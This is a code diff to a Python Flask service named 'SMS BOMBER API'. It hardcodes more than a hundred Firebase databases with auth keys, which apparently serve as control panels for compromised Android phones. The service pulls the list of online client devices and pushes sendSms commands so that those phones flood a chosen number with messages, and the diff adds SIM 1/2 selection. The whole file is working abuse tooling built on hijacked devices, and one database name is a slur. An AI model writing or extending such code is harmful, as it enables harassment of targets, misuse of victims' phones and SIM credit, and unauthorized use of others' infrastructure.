@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 SMS BOMBER API - Render.com Deployment
-ALL 127+ Firebase Databases - 100 SMS per device limit
+ALL 127+ Firebase Databases - SIM 1 & 2 Support
 Developer: @noobsater
 """
 
@@ -22,7 +22,7 @@ app = Flask(__name__)
 # ============================================================
 
 FIREBASE_CONFIGS = [
-    # ===== ASURPAPA wale (25) =====
+    # ===== ASURPAPA wale =====
     {"name": "sex-panel", "url": "https://sex-panel-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "ritesh0001", "url": "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "tika3", "url": "https://tika3-a400c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
@@ -49,7 +49,7 @@ FIREBASE_CONFIGS = [
     {"name": "acchahi", "url": "https://acchahi-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     {"name": "ankur", "url": "https://ankur-2511f-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
     
-    # ===== Different Keys wale (25) =====
+    # ===== Different Keys wale =====
     {"name": "ashu-415kumar", "url": "https://ashu-415kumar-default-rtdb.firebaseio.com", "auth": "1"},
     {"name": "adsf", "url": "https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "1"},
     {"name": "surya", "url": "https://surya-917b9-default-rtdb.firebaseio.com", "auth": "Vo"},
@@ -76,7 +76,7 @@ FIREBASE_CONFIGS = [
     {"name": "niggasionic", "url": "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Hah"},
     {"name": "burchanno", "url": "https://burchanno-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Pp"},
     
-    # ===== URL = Key wale (75+) =====
+    # ===== URL = Key wale =====
     {"name": "hood", "url": "https://hood-4ba1e-default-rtdb.firebaseio.com", "auth": "https://hood-4ba1e-default-rtdb.firebaseio.com"},
     {"name": "lucifer", "url": "https://lucifer-spreader-default-rtdb.firebaseio.com", "auth": "https://lucifer-spreader-default-rtdb.firebaseio.com"},
     {"name": "totla-axis", "url": "https://totla-axis-default-rtdb.firebaseio.com", "auth": "https://totla-axis-default-rtdb.firebaseio.com"},
@@ -155,7 +155,7 @@ FIREBASE_CONFIGS = [
     {"name": "riyy", "url": "https://riyy-e012e-default-rtdb.firebaseio.com", "auth": "https://riyy-e012e-default-rtdb.firebaseio.com"},
     {"name": "xkpz", "url": "https://xkpz-f937a-default-rtdb.firebaseio.com", "auth": "https://xkpz-f937a-default-rtdb.firebaseio.com"},
     
-    # ===== Extra (Naye jo tune diye) =====
+    # ===== Extra =====
     {"name": "oyilo", "url": "https://oyilo-5cada-default-rtdb.firebaseio.com", "auth": "https://oyilo-5cada-default-rtdb.firebaseio.com"},
     {"name": "rahul-fd65f", "url": "https://rahul-fd65f-default-rtdb.firebaseio.com", "auth": "V"},
     {"name": "admin-no-43", "url": "https://admin-no-43-default-rtdb.firebaseio.com", "auth": "V"},
@@ -176,7 +176,6 @@ device_usage = {}
 # ============================================================
 
 def safe_int(value):
-    """Safely convert any value to integer"""
     if not value:
         return 0
     if isinstance(value, int):
@@ -188,21 +187,6 @@ def safe_int(value):
         except:
             return 0
     return 0
-
-def is_online(info):
-    """Check if device is online"""
-    if info.get('status') == True:
-        return True
-    battery = info.get('battery')
-    if battery:
-        batt_int = safe_int(battery)
-        if batt_int > 0:
-            return True
-    return False
-
-def has_sim(info):
-    """Check if device has SIM"""
-    return bool(info.get('sim1') or info.get('sim') or info.get('phone') or info.get('number'))
 
 def get_today():
     return datetime.now().strftime("%Y-%m-%d")
@@ -229,13 +213,14 @@ def fetch_devices(config):
             return []
         devices = []
         for client_id, info in data.items():
-            online = is_online(info)
-            if online and has_sim(info):
+            # Check if online - status or battery
+            is_online = info.get('status') == True or safe_int(info.get('battery')) > 0
+            if is_online:
                 devices.append({
                     "id": client_id,
                     "firebase": config['name'],
                     "config": config,
-                    "sim": info.get('sim1') or info.get('sim') or info.get('phone') or info.get('number')
+                    "sim": info.get('sim') or info.get('sim1') or info.get('sim2') or 1
                 })
         return devices
     except:
@@ -249,15 +234,15 @@ def fetch_all_devices():
         all_devices.extend(devices)
     return all_devices
 
-def send_sms(config, client_id, to_number, message):
-    """Send SMS using a device"""
+def send_sms(config, client_id, to_number, message, sim=1):
+    """Send SMS using a device with SIM support"""
+    # Match the exact format from your request
     url = f"{config['url']}/clients/{client_id}/webhookEvent/sendSms.json?auth={config['auth']}"
     payload = {
-        "from": random.randint(1, 99),
+        "sim": sim,
         "to": str(to_number),
         "message": str(message),
-        "isSended": False,
-        "timestamp": int(time.time() * 1000)
+        "isSended": False
     }
     try:
         response = requests.put(url, json=payload, timeout=10)
@@ -312,6 +297,7 @@ def send_sms_api():
     number = request.args.get('number')
     message = request.args.get('msg')
     count = int(request.args.get('count') or 1)
+    sim = int(request.args.get('sim') or 1)  # SIM 1 or 2
     
     if not number or not message:
         return jsonify({"success": False, "error": "Number and message required!"}), 400
@@ -322,14 +308,14 @@ def send_sms_api():
     if not all_devices:
         return jsonify({
             "success": False,
-            "error": "No devices with SIM found!",
+            "error": "No devices found!",
             "firebases": len(FIREBASE_CONFIGS)
         }), 404
     
     sent, failed = 0, 0
     
     def worker(device):
-        success = send_sms(device['config'], device['id'], number, message)
+        success = send_sms(device['config'], device['id'], number, message, sim)
         return success
     
     with ThreadPoolExecutor(max_workers=10) as ex:
@@ -343,6 +329,7 @@ def send_sms_api():
         "success": sent > 0,
         "target": number,
         "message": message,
+        "sim": sim,
         "requested": max_count,
         "sent": sent,
         "failed": failed,
